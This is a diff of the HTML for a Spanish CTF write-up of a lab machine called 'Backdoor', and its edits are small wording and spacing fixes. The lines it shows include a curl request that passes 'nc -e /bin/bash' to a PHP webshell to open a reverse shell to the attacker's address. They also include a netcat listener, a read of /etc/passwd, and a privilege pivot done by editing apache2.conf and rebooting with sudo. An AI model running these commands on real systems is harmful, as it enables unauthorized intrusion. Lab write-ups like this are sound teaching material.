@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-06-02",
         "description": "Writeup Backdoor 🔴",
-        "wordCount":  612 ,
+        "wordCount":  616 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-06-02",
         "image": {
@@ -248,8 +248,8 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </span></span></code></pre></div><p>Uso la secure webshell para conectarme al sistema.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -X POST -d &#39;password=newpassword&amp;cmd=nc -e /bin/bash  192.168.1.18 1234&#39; http://192.168.1.58/Backdoor/php-backdoor.php
-</span></span></code></pre></div><p>Obtengo la shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -X POST -d &#39;password=newpassword&amp;cmd=nc -e /bin/bash 192.168.1.18 1234&#39; http://192.168.1.58/Backdoor/php-backdoor.php
+</span></span></code></pre></div><p>Obtengo la shell.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvp 1234
 </span></span><span style="display:flex;"><span>listening on [any] 1234 ...
 </span></span><span style="display:flex;"><span>connect to [192.168.1.18] from backdoor.nyx [192.168.1.58] 41778
@@ -276,13 +276,13 @@ stroke-linejoin="round" class="feather feather-home">
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@backdoor:/var/www/html/Backdoor$ cat /etc/passwd | grep /bin/bash
 </span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
 </span></span><span style="display:flex;"><span>rootkit:x:1000:1000:rootkit,,,:/home/rootkit:/bin/bash
-</span></span></code></pre></div><p>Edito el archivo <code>apache2.conf</code> y añado estas dos líneas al final del archivo.</p>
+</span></span></code></pre></div><p>Edito el archivo <code>apache2.conf</code> y añado estas dos líneas al final del archivo para pivotar de usuario.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>User rootkit
 </span></span><span style="display:flex;"><span>Group rootkit
-</span></span></code></pre></div><p>Como puedo usar el binario reboot como usuario root  reinicio la máquina.</p>
+</span></span></code></pre></div><p>Como puedo usar el binario reboot como usuario root reinicio la máquina.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>www-data@backdoor:/var/www/html/Backdoor$ sudo -u root /usr/sbin/reboot
 </span></span></code></pre></div><p>Una vez se ha reiniciado la máquina vuelvo a usar la webshell.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -X POST -d &#39;password=newpassword&amp;cmd=nc -e /bin/bash  192.168.1.18 1234&#39; http://192.168.1.58/Backdoor/php-backdoor.php
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -X POST -d &#39;password=newpassword&amp;cmd=nc -e /bin/bash 192.168.1.18 1234&#39; http://192.168.1.58/Backdoor/php-backdoor.php
 </span></span></code></pre></div><p>Y obtengo la shell como usuario rootkit.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 1234
 </span></span><span style="display:flex;"><span>listening on [any] 1234 ...
@@ -305,7 +305,7 @@ stroke-linejoin="round" class="feather feather-home">
 <p><img src="/../machines/nyx/backdoor/b-help.webp" alt="b-help"></p>
 <p>Escribo <strong>!id</strong> y veo que soy root.</p>
 <p><img src="/../machines/nyx/backdoor/verificacioncommandos.webp" alt="verificacioncommandos"></p>
-<p>Para obtener una shell de root utilizo nectat.</p>
+<p>Para obtener una shell de root utilizo netcat.</p>
 <p><img src="/../machines/nyx/backdoor/root-1.webp" alt="root-1"></p>
 <p>Obtengo la shell.</p>
 <p><img src="/../machines/nyx/backdoor/root-2.webp" alt="root-2"></p>
